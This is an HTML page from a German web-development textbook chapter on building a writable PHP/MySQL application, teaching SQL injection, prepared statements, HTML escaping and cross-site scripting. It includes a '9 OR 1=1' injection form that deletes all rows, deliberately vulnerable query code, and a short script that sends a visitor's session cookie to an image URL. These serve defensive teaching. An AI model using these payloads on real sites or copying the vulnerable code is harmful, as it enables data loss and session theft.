@@ -1,0 +1,866 @@
+<!DOCTYPE html> 
+<!--[if lt IE 7 ]> <html lang="en" class="no-js ie6 web-development"> <![endif]-->
+<!--[if IE 7 ]>    <html lang="en" class="no-js ie7 web-development"> <![endif]-->
+<!--[if IE 8 ]>    <html lang="en" class="no-js ie8 web-development"> <![endif]-->
+<!--[if IE 9 ]>    <html lang="en" class="no-js ie9 web-development"> <![endif]-->
+<!--[if (gt IE 9)|!(IE)]><!--> <html lang="en" class="no-js web-development"> <!--<![endif]-->
+<head> 
+
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+
+  <title>Lehrbuch Web-Development - Web-Applikation mit Schreibrecht</title>
+   
+  <meta name="author" content="Brigitte Jellinek"> 
+  <meta name="description" content="Ein Lehrbuch für das Informatik- oder Medieninformatik-Studium."> 
+
+  <meta name="viewport" content="width=device-width; initial-scale=1.0; maximum-scale=1.0;">
+  <meta name="generator" content="nanoc 3.1.6">
+
+  <link rel="shortcut icon" href="/assets/img/favicon.ico">
+
+  <link rel="stylesheet" href="/assets/css/bootstrap.css?v=1">
+  <link rel="stylesheet" href="/assets/css/prettify.css?v=1">
+  <style>
+    body {  padding-top: 90px; }
+    article {  padding-top: 40px; }
+    body, p, li, dt, dd {  
+      font-size: 15px; 
+      line-height: 1.5 ;
+    }
+  </style>
+
+  <script src="/assets/js/jquery.js?v=1.7.1"></script>
+  <script src="/assets/js/bootstrap.js?v=1"></script>
+  <script src="/assets/js/prettify.js?v=1"></script>
+  <script src="/assets/js/libs/modernizr-1.5.min.js?v=1"></script>
+
+</head>
+<body>
+
+<a href="http://github.com/bjelline/web-development-textbook/"><img style="position: absolute; top: 0; right: 0; border: 0;" src="https://a248.e.akamai.net/assets.github.com/img/30f550e0d38ceb6ef5b81500c64d970b7fb0f028/687474703a2f2f73332e616d617a6f6e6177732e636f6d2f6769746875622f726962626f6e732f666f726b6d655f72696768745f6f72616e67655f6666373630302e706e67" alt="Fork me on GitHub"></a>
+<div class="container">
+
+  <header class="jumbotron sub-header">
+      <h1><a href="/" title="Web Development">Web Development</a></h1>
+      <p class="lead">Ein Lehrbuch für das Informatik oder Medien-Informatik Studium.</p>
+  </header>
+    
+
+
+
+	<!-- body -->
+	<article id="body" class="row">
+		
+		<div class="span8">
+		
+			
+                          <div class="page-header">
+				<h2 class="title">Web-Applikation mit Schreibrecht</h2>
+                          </div>
+			
+			
+			<p>Hier der Plan für die einzelnen Seiten dieser Applikation:</p>
+
+<p>Titel</p>
+
+<p>Dateiname</p>
+
+<p>Request/</p>
+
+<p>Parameter</p>
+
+<p>Beschreibung</p>
+
+<p>Person löschen</p>
+
+<p>delete.php</p>
+
+<p>POST pid</p>
+
+<p>Löscht die Person mit der angegeben pid. </p>
+
+<p>Person einfügen</p>
+
+<p>person_new.php</p>
+
+<p>GET</p>
+
+<p>Zeigt Eingabeformular für eine neue Person</p>
+
+<p>Person einfügen</p>
+
+<p>person_new.php</p>
+
+<p>POST uid,vorname,nachname, profil,mail,web, blog,feed,title, isfemale,ifshow</p>
+
+<p>Legt eine neue Person an.</p>
+
+<p>Person bearbeiten</p>
+
+<p>person_edit.php</p>
+
+<p>GET pid</p>
+
+<p>Zeigt Bearbeitungs-Formuar an</p>
+
+<p>Person bearbeiten</p>
+
+<p>person_edit.php</p>
+
+<p>POST pid, vorname, nachname, profil,</p>
+
+<p>Speichert neue Daten zur Person pid</p>
+
+<h2 id="daten-lschen">Daten löschen</h2>
+<p>Das Löschen könnte so einfach sein: Ein Programm mit namen delete.php, das als Parameter die id der Person erhält, die gelöscht werden soll:</p>
+
+<pre><code>  $pid   = $_POST['pid'];
+  $dbh-&gt;query("DELETE FROM person WHERE pid=$pid" );
+</code></pre>
+
+<p>Dieses Programm ist anfällig für folgende Attacke: Ein Aufruf mit einem selbst gebastelten Formular setzt den Parameter pid auf Wert „9 OR 1=1“</p>
+
+<pre><code>  &lt;form method="post" action="delete.php" &gt;
+      &lt;input type="hidden" value="9 OR 1=1" name="pid"/&gt;
+      &lt;input type="submit" value="del all"/&gt;
+  &lt;/form&gt;
+</code></pre>
+
+<p>Das führt dazu, dass folgendes SQL-Statement ausgeführt wird:</p>
+
+<pre><code>  DELETE FROM person WHERE pid=9 OR 1=1
+</code></pre>
+
+<p>Und dieses Statement löscht nicht einen Datensatz sondern alle Datensätze. Diese Art von Attacke auf eine Web-Applikation nennt man „SQL Injection“.</p>
+
+<p>SQL Injection verhindern
+Dieses Problem kann vermeiden indem man die Eingabe genau überprüft. In diesem Beispiel also: nur wenn es sich bei pid um eine ganze Zahl handelt, darf sie verwendet werde. Das wird hier mit einer Regular Expression (die Sie noch nicht verstehen müssen) überprüft:</p>
+
+<pre><code>  if( ! preg_match( '/^\d+$/', $pid ) ) {
+      error_log("hack: $pid statt id in delete.php.");
+      echo("Hack detected. Please stay at you computer until the police arrive.");
+      exit;
+  }
+</code></pre>
+
+<p>Der zweite Ansatz ist die Verwendung von „Prepared Statements“ in der Datenbank. Dabei wird der SQL-Interpreter der Datenbank gänzlich umgangen. </p>
+
+<p>Als erster Schritt wird mit prepare ein SQL-Statement mit Fragenzeichen als Platzhalter vorbereitet. (Dieses SQL-Statement wird am Server schon mal geparsed und compiliert.) Mit execute wird das Statement ausgeführt, dabei werden die Platzhalter durch echte Daten ersetzt.  Das schöne dabei: es wird nie ein SQL-Statement als String gebaut, sondern die einzufügenden Daten werden binär an den Datenbankserver übertragen. Darin enthaltene SQL-Fragement können keinen Schaden anrichten.</p>
+
+<pre><code>  $sth = $dbh-&gt;prepare("DELETE FROM person WHERE pid = ?");
+  $sth-&gt;execute(array($pid));
+</code></pre>
+
+<p>execute kann auch mehrfach ausgeführt werden, das ist effektiver als eine normales query zu wiederholen.</p>
+
+<p>Authorisierung nicht vergessen!
+Wir haben eine Sicherheitslücke geschlossen, aber es bleibt trotzdem noch viel zu tun: Löschen, Einfügen, Bearbeiten soll nur nach dem Login möglich sein!</p>
+
+<h2 id="daten-einfgen">Daten einfügen</h2>
+<p>Hier das einfachste Programm, das ein neues Werk speichert:</p>
+
+<pre><code>  mysqli_query( $db, "INSERT INTO werk (titel) VALUES ('$_POST[titel]')" );
+</code></pre>
+
+<p>Das funktioniert für viele Eingaben, aber was passiert wenn ein Werk den Titel „That’s it“ haben soll? Dann wird folgendes SQL-Statement ausgeführt:</p>
+
+<pre><code>  INSERT INTO werk (titel) VALUES ('That's it')
+</code></pre>
+
+<p>Das kann nicht funktionieren. Für dieses Problem gibt es in PHP eine einfache und falsche Lösung:</p>
+
+<p>Normalerweise verändert PHP automatisch alle Daten die über GET, POST  und Cookies hereinkommen: vor alle Anführungszeichen wird ein Backslash eingefügt.  Aus „That’s it“ wird also automatisch „That's it“ , das SQL-Statement funktioniert wieder:</p>
+
+<pre><code>  INSERT INTO werk (titel) VALUES ('That\'s it')
+</code></pre>
+
+<p>Diese Automatik ist unter dem Namen „magic_quotes“ bekannt und kann in der Apache- oder PHP-Konfiguration abgeschalten14 werden. Auf dem MMT-Server ist sie generell ausgeschalten. Sie sollten das auf Ihrem lokalen Apache-Server auch tun:</p>
+
+<p>php_flag magic_quotes_gpc off</p>
+
+<p>Mit folgendem Programm können Sie testen ob auf dem Server magic quotes ein- oder ausgeschalten sind:</p>
+
+<pre><code>  echo( (get_magic_quotes_gpc() ? "mit magic quotes" : "ohne magic quotes") );
+  echo("&lt;pre&gt;");
+  print_r($_POST);
+  echo("&lt;/pre&gt;");
+</code></pre>
+
+<p>(In Wirklichkeit kann man Sie nicht ganz abschalten15, aber das ignorieren wir besser. Das Problem betrifft nur Array-Parameter .)
+Wenn die magic quotes abgeschalten sind kann man das SQL-Problem besser lösen: mit prepared Statements. Hier am Beispiel eines neuen Werkes:</p>
+
+<pre><code>  $sth = $dbh-&gt;prepare(
+        "INSERT INTO person 
+          (uid,vorname,nachname, profil,mail,web, blog,feed,title, isfemale,ifshow) 
+            VALUES 
+          (?,?,?,?,?,?,?,?,?,?,?)");
+                        
+  $sth-&gt;execute(
+              array(
+                $_POST['uid'],
+                $_POST['vorname'],
+                $_POST['nachname'],
+                $_POST['profil'],
+                $_POST['mail'],
+                $_POST['web'],
+                $_POST['blog'],
+                $_POST['feed'],
+                $_POST['title'],
+                $_POST['isfemale'],
+                $_POST['ifshow']
+              )
+          );
+   // noch ohne Fehlerbehandlung
+</code></pre>
+
+<p>Beim Einfügen in die Personen-Tabelle kann es leicht zu Problemen kommen:  die Tabelle verlangt in 3 Spalten einen eindeutigen Eintrag, wenn man hier einfach nichts eingibt gibt das einen Fehler.</p>
+
+<p>So weit sollten Sie es nicht kommen lasse: Sie sollten die Eingaben aus dem Webformular schon vor dem INSERT prüfen und dann ausführliche, vollständige, deutsche Fehlermeldungen ausgeben.</p>
+
+<p><img  alt="Abbildung 149: Fehlermeldung der Datenbank vs. selbst gestaltete Fehlermeldung" src="/images/image367.png" /></p>
+
+<p>Falls das Einfügen der Daten funktioniert hat und in der Tabelle ein autoincrement-Feld als Primärschlüssel vorhanden ist, kann man den Wert des Schlüssels im neuen Datensatz auslesen und weiter verwenden:</p>
+
+<pre><code>  $pid = $dbh-&gt;lastInsertId(); 
+  header("Location: person.php?pid=$pid");
+</code></pre>
+
+<p>Auch hier ist eine Weiterleitung direkt nach dem POST-Request sinnvoll: nach dem Einfügen des Datensatzes wird direkZZt auf die Anzeige des neuen Datensatzes weitergeleitet. Falls man danach auf „Reload“ drückt wird der Datensatz neu angezeigt, aber keinesfalls ein zweites Mal eingefügt.</p>
+
+<h2 id="einen-datensatz-bearbeiten">Einen Datensatz bearbeiten</h2>
+<p>Wir wollen einen Datensatz aus der Datenbank laden, in einem Formular zur Bearbeitung anbieten, und dann wieder in der Datenbank speichern.</p>
+
+<p><img  alt="Abbildung 150: Formular zum Bearbeiten einer Person" src="/images/image368.png" /></p>
+
+<p>Das Lesen des Datensatzes aus der Datenbank erfolgt nun auch mit einem prepared Statement:</p>
+
+<pre><code>  $sth = $dbh-&gt;prepare("SELECT pid,vorname,nachname,profil FROM person WHERE pid = :pid");
+  $sth-&gt;bindValue(':pid', $_GET['pid'], PDO::PARAM_INT);
+  $sth-&gt;execute();
+  $person=$sth-&gt;fetchObject();
+</code></pre>
+
+<p>Bei der Darstellung des Bearbeitungs-Formulars werden die Daten nun als Standardwerte dargestellt. Das passiert bei Textfeldern mit dem Value-Attribute und bei Textareas als Inhalt des Tags:</p>
+
+<pre><code>  &lt;input name="vorname" value="Tobias" /&gt;
+  &lt;textarea name="profil" rows="7"&gt;Webdesigner und Programmierer.&lt;/textarea&gt;
+</code></pre>
+
+<p>Achtung: Falls in den Daten Anführungszeichen, kaufmännische Unds oder Kleiner-Zeichen vorkommen müssen diese für HTML escaped werden.  Hier ein Beispiel in MySQL:</p>
+
+<pre><code>  mysql&gt; select vorname,profil from person where pid=538;
+  +---------------------+-----------------------------+
+  | vorname             | profil                      |
+  +---------------------+-----------------------------+
+  | Tobias "the coder"  | Mein Lieblings-Tag: &lt;style&gt; |
+  +---------------------+-----------------------------+
+  1 row in set (0.00 sec)
+</code></pre>
+
+<p>So würde die Darstellung der Eingabefelder nicht funktionieren:</p>
+
+<pre><code>  &lt;input name="vorname" value="Tobias "the coder" " /&gt;
+  &lt;textarea name="profil" rows="7"&gt;Mein Lieblings-Tag: &lt;style&gt;&lt;/textarea&gt;
+</code></pre>
+
+<p>Richtig ist die Darstellung gewisser Zeichen als HTML entities:</p>
+
+<pre><code>  &lt;input name="vorname" value="Tobias &amp;quot;the coder&amp;quot; " /&gt;
+  &lt;textarea name="profil" rows="7"&gt;Mein Lieblings-Tag: &amp;lt;style&amp;gt;&lt;/textarea&gt;
+</code></pre>
+
+<p>Diese Ersetzung wird mit der Funktion htmlspecialchars vorgenommen:</p>
+
+<pre><code>  $person-&gt;vorname  = htmlspecialchars( $person-&gt;vorname  );
+</code></pre>
+
+<p>Zusammenfassend sieht die Darstellung des Eingabeformulars so aus:</p>
+
+<pre><code>  // $pid  muss man nicht escapen, das ist blos ein integer
+      $person-&gt;vorname  = htmlspecialchars( $person-&gt;vorname  );
+      $person-&gt;nachname = htmlspecialchars( $person-&gt;nachname );
+      $person-&gt;profil   = htmlspecialchars( $person-&gt;profil   );
+
+  include "header.php";
+  ?&gt;
+  &lt;form action="person_edit.php" method="post"&gt;
+  &lt;input type="hidden" name="pid" value="&lt;?= $person-&gt;pid ?&gt;" /&gt;
+  &lt;p&gt;&lt;label class="leftcol" for="vorname"&gt;Vorname&lt;/label&gt;   
+     &lt;input name="vorname" value="&lt;?= $person-&gt;vorname ?&gt;" /&gt;&lt;/p&gt;
+  &lt;p&gt;&lt;label class="leftcol" for="nachname"&gt;Nachname&lt;/label&gt; 
+     &lt;input  name="nachname" value="&lt;?= $person-&gt;nachname ?&gt;" /&gt;&lt;/p&gt;
+  &lt;p&gt;&lt;label class="leftcol" for="profil"&gt;Profil&lt;/label&gt;     
+     &lt;textarea name="profil" rows="7" cols="40" &gt;&lt;?= $person-&gt;profil ?&gt;&lt;/textarea&gt;&lt;/p&gt;
+  &lt;p&gt;&lt;span class="leftcol"&gt;&lt;/span&gt;&lt;input type="submit" value="speichern" /&gt;&lt;/p&gt;
+  &lt;/form&gt; Die veränderten Daten werden mit POST an person_edit.php geschickt. Aus den Daten wird ein UPDATE-Statement erstellt:
+
+  if( $_POST['pid'] ) {
+    $sth = $dbh-&gt;prepare( "UPDATE person SET vorname = ?, nachname = ?, profil = ?  WHERE pid=?");
+    $sth-&gt;execute(array(
+      $_POST['vorname'],
+      $_POST['nachname'],
+      $_POST['profil'],
+      $_POST['pid']
+    ));
+    header("Location: person.php?pid=$_POST[pid]");
+    exit; } Escapen von HTML ----------------- Das Escapen der Daten für HTML hätten wir von Anfang an bei jeder Ausgabe von Daten aus der Datenbank zu müssen. Also auch schon in Kapitel 6.3 beim Anzeigen der Daten. Damals haben wir einfach die Daten direkt mit echo ausgegeben:
+
+  &lt;?= $anrede ?&gt;
+  &lt;?= $person-&gt;vorname ?&gt;
+  &lt;?= $person-&gt;nachname ?&gt;
+  hat insgesamt  &lt;?= $werks_anz ?&gt; Werke in dieser Datenbank.
+</code></pre>
+
+<p>Wenn hier im Profil wieder „Mein Lieblings-Tag ist &lt;style&gt;“ steht, und dieser Text einfach ausgegeben wird, dann „verschwindet“ der Rest der Webseite, weil er sich nun innerhalb eines Style-Tags befindet.</p>
+
+<pre><code>  $bildpfad  = htmlspecialchars( $person['bildpfad'] );
+  $uid       = htmlspecialchars( $person['uid'     ] );
+  $vorname   = htmlspecialchars( $person['vorname' ] );
+  $nachname  = htmlspecialchars( $person['nachname'] );
+  $profil    = htmlspecialchars( $person['profil'  ] );
+
+  echo &lt;&lt;&lt;EOM
+      &lt;p&gt;&lt;img src="http://multimediaart.at/media/profil/$bildpfad" style="float:right" /&gt;
+      $anrede $vorname $nachname hat insgesamt x Werke in dieser Datenbank.
+      $ersie hat den Usernamen $uid.&lt;/p&gt;
+
+      &lt;div&gt;$profil&lt;/div&gt;
+  EOM;
+</code></pre>
+
+<p>Damit funktioniert nun die Darstellung des Datensatzes richtig:</p>
+
+<p><img  alt="Abbildung 151: Korrekte Darstellung eines Datensatzes mit kleiner-Zeichen" src="/images/image369.png" /></p>
+
+<h2 id="darstellen-von-html">Darstellen von HTML</h2>
+<p>Im letzten Beispielen wurde der eingegebene HTML-Tag sichtbar auf der Webseite angezeigt. Wie kann man HTML-Tags eingeben, abspeichern, und als HTML-Tags wieder anzeigen?</p>
+
+<p>Gefahren
+Zuerst eine Warnung: Die Anzeige von HTML das von Fremden eingegeben wurde ist gefährlich! Dazu zwei Beispiele: Sie bauen ein Gästebuch in dem BesucherInnen beliebiges HTML abspeichern können. Herr Lauscher trägt dort ein Bild ein:</p>
+
+<pre><code>  &lt;img src="http://laucher.net/bild.php?woher=gaestebuch_mmt" alt="harmloses bild" /&gt;
+</code></pre>
+
+<p>Das Bild wird also nicht von Ihrem Webserver geladen, sondern vom Webserver von Herrn Lauscher. Und dort wird gleich ein php-Programm zum Erzeugen des Bildes aufgerufen. D.h. Herr Lauscher kann sehr bequem mit-loggen wie viele Zugriffe auf das Gästebuch erfolgen. Falls Herr Lauscher die Gästebuch-Besucher schon kennt (schon ein Cookie in Ihrem Browser gesetzt hat) kann er sie auch identifizieren.</p>
+
+<p>Sie haben Herrn Lauscher also die Möglichkeit gegeben sehr viel über Ihre BesucherInne zu erfahren. So etwas ähnliches passiert z.B. wenn Sie Google Analytics in Ihre Webseite einbinden um Zugriffs-Statistiken zu erstellen: Google erfährt von jedem Zugriff auf Ihre Seite, Google kennt viele BesucherInnen schon (weil Sie bei gmail.com eingeloggt sind oder von einer Vorherigen Suche noch ein Cookie haben.)</p>
+
+<p>Im zweiten Beispiel gibt Frau Hacker neben einem Bild noch etwas Javascript ein:</p>
+
+<p>Hallo Welt </p>
+
+<pre><code>  &lt;img src="http://users.local/bild.php" alt="harmloses bild" id="hack_tool" /&gt;
+  &lt;script&gt;
+     document.getElementById("hack_tool").src += "?keks=" + document.cookie;
+  &lt;/script&gt;
+</code></pre>
+
+<p>Mit der einen Zeile Javascript wir das Cookie an die URL des Bildes angefügt, das Ergebnis ist z.B:</p>
+
+<pre><code>  &lt;img id="hack_tool" alt="harmloses bild" src="http://users.local/bild.php?keks=PHPSESSID=6b454e966f9fc9b9a9d5126ffb076115"/&gt;
+</code></pre>
+
+<p>So kann Frau Hacker das Cookie einer BesucherIn Ihres Gästebuchs entwenden. Sie kann nun das Cookie verwenden um als eingeloggter User Ihre Seite zu benützen!</p>
+
+<p>Lassen Sie niemals, niemals, niemals zu, dass Fremde Javascript in Ihre Site einspeisen können!</p>
+
+<p>Noch hat unsere Applikation dieses Problem nicht: Wenn Frau Hacker Ihren Code z.B. in das Profil einer Person eingibt wir der Code htmlescaped angezeigt und „wirkt nicht“:</p>
+
+<p><img  alt="Abbildung 152: Eingegebener HTML+Javascript-Code wird escaped und dargestellt" src="/images/image370.png" /></p>
+
+<p>Sichere Eingabe von HTML
+Für die Beispiel-Applikation wollen wir Zulassen, dass im Profil die HTML-Tags &lt;p&gt; und &lt;b&gt; verwendet werden können, mehr nicht. Dass es nur diese Tags und keine anderen sind wird bei der Eingabe und der Bearbeitung sicher gestellt:</p>
+
+<pre><code>  $profil = strip_tags( $_POST['profil'], "&lt;p&gt;&lt;b&gt;" );
+</code></pre>
+
+<p>Nun können Sie auch die Ausgabe des Profils umstellen und auf das escapen verzichten:</p>
+
+<p>Die Eingabe des HTML-Codes können Sie mit einem Javascript-Editor wie TinyMCE16 erleichtern. TinyMCE verwandelt eine normale Textarea in einen wysiwyg-Editor:</p>
+
+<p><img  alt="Abbildung 153: Normale Textarea (oben) kann mit TinyMCE in einen wysiwyg-Editor (unten) verwandelt werden" src="/images/image371.png" /></p>
+
+		
+			<div class="pagination">
+  <ul>
+    
+      <li><a href="/session/session-und-login/">← <span class="article">Session und Login</a></li>
+    
+    
+  </ul>
+</div>
+
+		</div>
+		
+		<!-- sidebar -->
+<div id="sidebar" class="span3 offset1">
+        <div class="page-header"> 
+        <h2>Kapitel</h2>
+        </div>
+
+        
+        <ul class="nav nav-list">
+        
+          
+            <li ><a href="/das-web-und-html/">DAS WEB UND HTML</a>
+              <ul class="sub">
+                
+                  
+                    
+                      
+                    
+                      
+                      <li ><a href="/das-web-und-html/geschichte/">Eine Kurze Geschichte des World Wide Web</a></li>
+                      
+                    
+                      
+                      <li ><a href="/das-web-und-html/standards/">Drei Standards definieren das Web</a></li>
+                      
+                    
+                      
+                      <li ><a href="/das-web-und-html/html-grundkurs/">HTML Grundkurs</a></li>
+                      
+                    
+                      
+                      <li ><a href="/das-web-und-html/upload/">Upload und Tools</a></li>
+                      
+                    
+                  
+                
+              </ul>
+            </li>
+          
+            <li ><a href="/css/">CSS</a>
+              <ul class="sub">
+                
+                  
+                    
+                      
+                    
+                      
+                      <li ><a href="/css/css-kurz/">Kurzvorstellung von Stylesheets</a></li>
+                      
+                    
+                      
+                      <li ><a href="/css/geschichte/">Geschichte von CSS</a></li>
+                      
+                    
+                      
+                      <li ><a href="/css/css/">Syntax von CSS</a></li>
+                      
+                    
+                      
+                      <li ><a href="/css/graceful/">Graceful Degradation</a></li>
+                      
+                    
+                  
+                
+              </ul>
+            </li>
+          
+            <li ><a href="/css-layout/">CSS LAYOUT</a>
+              <ul class="sub">
+                
+                  
+                    
+                      
+                    
+                      
+                      <li ><a href="/css-layout/rahmenbedingungen/">Rahmenbedingungen für Layout</a></li>
+                      
+                    
+                      
+                      <li ><a href="/css-layout/layout/">CSS für Layout</a></li>
+                      
+                    
+                      
+                      <li ><a href="/css-layout/navigation/">Navigationsmenü</a></li>
+                      
+                    
+                      
+                      <li ><a href="/css-layout/interaktion/">CSS für Interaktion</a></li>
+                      
+                    
+                      
+                      <li ><a href="/css-layout/selektoren/">CSS Selektoren im Detail</a></li>
+                      
+                    
+                  
+                
+              </ul>
+            </li>
+          
+            <li ><a href="/urls/">URLS</a>
+              <ul class="sub">
+                
+                  
+                    
+                      
+                    
+                      
+                      <li ><a href="/urls/absolut-relativ/">Absolute und relative URLs</a></li>
+                      
+                    
+                      
+                      <li ><a href="/urls/konfiguration/">Konfiguration</a></li>
+                      
+                    
+                      
+                      <li ><a href="/urls/tipps/">Pragmatische Tipps</a></li>
+                      
+                    
+                  
+                
+              </ul>
+            </li>
+          
+            <li ><a href="/formulare/">FORMULARE</a>
+              <ul class="sub">
+                
+                  
+                    
+                      
+                    
+                      
+                      <li ><a href="/formulare/form/">Formulare</a></li>
+                      
+                    
+                      
+                      <li ><a href="/formulare/interaktion/">Formular als Interaktion</a></li>
+                      
+                    
+                      
+                      <li ><a href="/formulare/action/">Daten absenden</a></li>
+                      
+                    
+                      
+                      <li ><a href="/formulare/php/">Formular und PHP</a></li>
+                      
+                    
+                      
+                      <li ><a href="/formulare/javascript/">Formular und Javascript</a></li>
+                      
+                    
+                  
+                
+              </ul>
+            </li>
+          
+            <li ><a href="/javascript-dom/">JAVASCRIPT DOM</a>
+              <ul class="sub">
+                
+                  
+                    
+                      
+                    
+                      
+                      <li ><a href="/javascript-dom/hintergrund/">Hintergründe</a></li>
+                      
+                    
+                      
+                      <li ><a href="/javascript-dom/basic-javascript/">Basic Javascript</a></li>
+                      
+                    
+                  
+                
+              </ul>
+            </li>
+          
+            <li ><a href="/jquery/">JQUERY</a>
+              <ul class="sub">
+                
+                  
+                    
+                      
+                    
+                      
+                      <li ><a href="/jquery/unobstrusive/">Unobstrusive Javascript</a></li>
+                      
+                    
+                      
+                      <li ><a href="/jquery/schreibweise/">Besondere Javascript-Schreibwesen in jQuery</a></li>
+                      
+                    
+                      
+                      <li ><a href="/jquery/selektieren-manipulieren/">Selektieren und Manipulieren mit jQuery</a></li>
+                      
+                    
+                      
+                      <li ><a href="/jquery/interaktion/">Interaktion mit jQuery</a></li>
+                      
+                    
+                      
+                      <li ><a href="/jquery/formularpruerung/">Formulardaten Prüfen mit jQuery</a></li>
+                      
+                    
+                  
+                
+              </ul>
+            </li>
+          
+            <li ><a href="/php-vorbereitung/">PHP VORBEREITUNG</a>
+              <ul class="sub">
+                
+                  
+                    
+                      
+                    
+                      
+                      <li ><a href="/php-vorbereitung/was-ist-php/">Was ist PHP? Was passiert am Webserver?</a></li>
+                      
+                    
+                      
+                      <li ><a href="/php-vorbereitung/apache/">Apache</a></li>
+                      
+                    
+                      
+                      <li ><a href="/php-vorbereitung/erstes-php-programm/">Das erste PHP-Programm</a></li>
+                      
+                    
+                  
+                
+              </ul>
+            </li>
+          
+            <li ><a href="/http/">HTTP</a>
+              <ul class="sub">
+                
+                  
+                    
+                      
+                    
+                      
+                      <li ><a href="/http/tcpip-und-dns/">TCP/IP und DNS</a></li>
+                      
+                    
+                      
+                      <li ><a href="/http/http/">HTTP</a></li>
+                      
+                    
+                      
+                      <li ><a href="/http/php-erzeugt/">PHP erzeugt nicht nur HTML</a></li>
+                      
+                    
+                      
+                      <li ><a href="/http/php-und-parameter/">In PHP Daten aus Web-Formularen verarbeiten</a></li>
+                      
+                    
+                      
+                      <li ><a href="/http/datei-upload/">Datei Upload</a></li>
+                      
+                    
+                  
+                
+              </ul>
+            </li>
+          
+            <li ><a href="/git/">GIT</a>
+              <ul class="sub">
+                
+                  
+                    
+                      
+                    
+                      
+                      <li ><a href="/git/versionskontrolle/">Versionskontrolle</a></li>
+                      
+                    
+                      
+                      <li ><a href="/git/basic-git/">Einfacher Arbeitsablauf in Git</a></li>
+                      
+                    
+                      
+                      <li ><a href="/git/git-status/">Status von Git abfragen</a></li>
+                      
+                    
+                  
+                
+              </ul>
+            </li>
+          
+            <li ><a href="/wordpress/">WORDPRESS</a>
+              <ul class="sub">
+                
+                  
+                    
+                      
+                    
+                      
+                      <li ><a href="/wordpress/was-ist-wordpress/">Was ist Wordpress</a></li>
+                      
+                    
+                      
+                      <li ><a href="/wordpress/installation/">Kurz-Installation von Wordpress</a></li>
+                      
+                    
+                      
+                      <li ><a href="/wordpress/security/">Security</a></li>
+                      
+                    
+                      
+                      <li ><a href="/wordpress/backend/">Überblick Backend</a></li>
+                      
+                    
+                      
+                      <li ><a href="/wordpress/seiten/">Artikel und Seiten</a></li>
+                      
+                    
+                      
+                      <li ><a href="/wordpress/multimedia/">Multimedia-Dateien</a></li>
+                      
+                    
+                      
+                      <li ><a href="/wordpress/themes-sidesbars-widgets/">Themes, Sidebars und Widgets verwenden</a></li>
+                      
+                    
+                      
+                      <li ><a href="/wordpress/plugins/">Plugins verwenden</a></li>
+                      
+                    
+                  
+                
+              </ul>
+            </li>
+          
+            <li ><a href="/php/">PHP</a>
+              <ul class="sub">
+                
+                  
+                    
+                      
+                    
+                      
+                      <li ><a href="/php/syntax/">Syntax von PHP</a></li>
+                      
+                    
+                      
+                      <li ><a href="/php/dateien/">Dateien und Ordnern in PHP</a></li>
+                      
+                    
+                      
+                      <li ><a href="/php/mail/">PHP und E-Mail</a></li>
+                      
+                    
+                  
+                
+              </ul>
+            </li>
+          
+            <li ><a href="/php-mysql/">PHP MYSQL</a>
+              <ul class="sub">
+                
+                  
+                    
+                      
+                    
+                      
+                      <li ><a href="/php-mysql/start/">Start mit PHP und MySQL</a></li>
+                      
+                    
+                      
+                      <li ><a href="/php-mysql/datenbank-lesen/">Eine lesende Web-Applikation</a></li>
+                      
+                    
+                  
+                
+              </ul>
+            </li>
+          
+            <li class="active"><a href="/session/">SESSION</a>
+              <ul class="sub">
+                
+                  
+                    
+                      
+                    
+                      
+                      <li ><a href="/session/session-und-login/">Session und Login</a></li>
+                      
+                    
+                      
+                      <li class="active"><a href="/session/53/">Web-Applikation mit Schreibrecht</a></li>
+                      
+                    
+                  
+                
+              </ul>
+            </li>
+          
+            <li ><a href="/php-mysql-2/">PHP MYSQL 2</a>
+              <ul class="sub">
+                
+                  
+                
+              </ul>
+            </li>
+          
+        
+        </ul>
+
+</div>
+<!-- sidebar -->
+
+		
+	</article>
+	<!-- /body -->
+
+
+  <div class="row">
+    <div class="span12" id="legal">
+        <p class="copyright">veröffentlicht unter <a href="http://creativecommons.org/licenses/by-nc-sa/3.0/at/deed.de">creative commons by-nc-sa</a> im Jahr 2012 von <a href="#">Brigitte Jellinek</a>.
+        <p>Zum Weiterentwickeln dieser Seite: <a href="https://github.com/bjelline/web-development-textbook/fork_select">Projekt forken</a> oder <a href="https://github.com/bjelline/web-development-textbook/blob/master/content/session/53.md">kommentar zu dieser seite</a></p>
+
+</p>
+    </div>
+  </div>
+
+</div> <!-- class="container" -->
+
+<script src="http://ajax.googleapis.com/ajax/libs/jquery/1.6.4/jquery.min.js"></script>
+<script>!window.jQuery && document.write(unescape('%3Cscript src="/assets/js/libs/jquery-1.6.4.min.js"%3E%3C/script%3E'))</script>
+<script>
+  $(document).ready(function(){
+    function save_state(){
+      var stored = "";
+      $('ul.nav > li').each(function(i,e){
+        if( $(e).find("i").attr('class') == 'icon-plus' ) {
+          stored += "-";
+        }  else {
+          stored += "+";
+        }
+      });
+      localStorage.setItem('nav-state', stored);
+    }
+    $('ul.nav > li > a').prepend("<i class='icon-plus'></i>");
+
+    // init state
+    var stored = localStorage.getItem('nav-state');
+    if ( stored ) {
+      var data = stored.split("");
+      $('ul.nav > li').each(function(i,e){
+        if( data[i] == "+" ) {
+          $(e).find(">ul").show();
+          $(e).find("i").removeClass('icon-plus').addClass('icon-minus');
+        } else {
+          $(e).find(">ul").hide();
+        }
+      });
+    } else {
+      $('ul.nav ul.sub').hide();
+    }
+    $('ul.nav li.active ul.sub').show();
+    $('ul.nav li.active i').removeClass('icon-plus').addClass('icon-minus');
+
+    $('ul.nav i').click(function(){
+      $this = $(this); 
+      $this.toggleClass('icon-plus').toggleClass('icon-minus');
+      $this.parent().next('ul').toggle();
+      save_state();
+      return false;
+    });
+  });
+</script>
+</body> 
+</html>
+
